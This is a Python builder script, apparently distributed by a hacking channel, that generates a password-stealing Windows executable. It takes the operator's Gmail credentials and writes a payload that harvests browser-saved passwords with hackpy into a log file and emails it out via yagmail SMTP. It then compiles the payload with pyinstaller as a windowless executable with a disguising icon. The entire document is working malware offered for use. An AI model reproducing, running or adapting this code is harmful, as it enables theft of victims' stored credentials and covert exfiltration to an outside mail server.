import yagmail
import hackpy
import colorama
from termcolor import colored
from os import system
from platform import platform
from time import sleep

colorama.init()

os = platform()[0], platform()[1],  platform()[2], platform()[3], platform()[4], platform()[5], platform()[6]

if os == ('W', 'i', 'n', 'd', 'o', 'w', 's'):
    delet = 'cls'
    dr = '\\'
else:
    delet = 'clear'
    dr = '/'


hi = """
_$$$$___$$$$$___$$$$$____$$$$___$$$$$$___$$$$___$$$$$
$$__$$__$$__$$__$$______$$__$$____$$____$$__$$__$$__$$
$$______$$$$$___$$$$____$$$$$$____$$____$$__$$__$$$$$
$$__$$__$$__$$__$$______$$__$$____$$____$$__$$__$$__$$
_$$$$___$$__$$__$$$$$___$$__$$____$$_____$$$$___$$__$$

_$$$$___$$$$$$__$$$$$____$$$$___$$______$$$$$___$$$$$
$$________$$____$$______$$__$$__$$______$$______$$__$$
_$$$$_____$$____$$$$____$$$$$$__$$______$$$$____$$$$$
____$$____$$____$$______$$__$$__$$______$$______$$__$$
_$$$$_____$$____$$$$$___$$__$$__$$$$$$__$$$$$___$$__$$		
"""

vr = """
 ____________________________________________________
|                                                    |
| [--] Created by: GorDX1                            |
|                                                    |
| [--] GitHub: https://github.com/GorDX              | 
|                                                    |
| [--] Telegram channel: @XakerInfo                  |
|                                                    |
| [--] Version: 1.0.0                                |
|____________________________________________________|
"""


def load5():
    print(colored('Loading.', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading..', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading...', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading.', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading..', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading...', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading.', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading..', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading...', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading.', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading..', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading...', 'green'))
    sleep(0.5)   
    system(delet)


system(delet)

print(colored(hi, 'green')+colored(vr,'red'))

print(colored('Only works with Gmail', 'red'))
print()
email = input(colored('Enter Email: ', 'blue'))
passwrd = input(colored('Enter email password: ', 'blue'))


icon = 'builder'+dr+'icon.ico'


code = 'login = '+"'"+email+"'"+'\n'+'password = '+"'"+passwrd+"'"+"""

import yagmail
from hackpy.passwords import *

f = open('D:\\log.txt', 'w')

for key, account in passwordsRecovery():
       passw = '['  + str(key) + ']'+'|SITE: ' + account['url'] + '|USER: ' + account['login'] + '|PASS: ' + account['password']
       f.write(passw)
f.close()
receiver = login
body = 'Passwords'
filename = 'D:\\log.txt'

yag = yagmail.SMTP(login, password)
yag.send(
    to=receiver,
    subject="Passwords",
    contents=body, 
    attachments=filename,
)
"""


f = open('stealer.py', mode = 'w', encoding='utf-8')
f.close()
bk = open('stealer.py',  mode = 'a', encoding='utf-8')
bk.write(code)
bk.close()
load5()
system('cd builder')
system('pyinstaller -F --noconsole -i '+icon+' stealer.py')
print(colored('The stealer.exe file is saved in the "dist" folder', 'green'))
print()
print(colored('Press Enter', 'green'))
input()

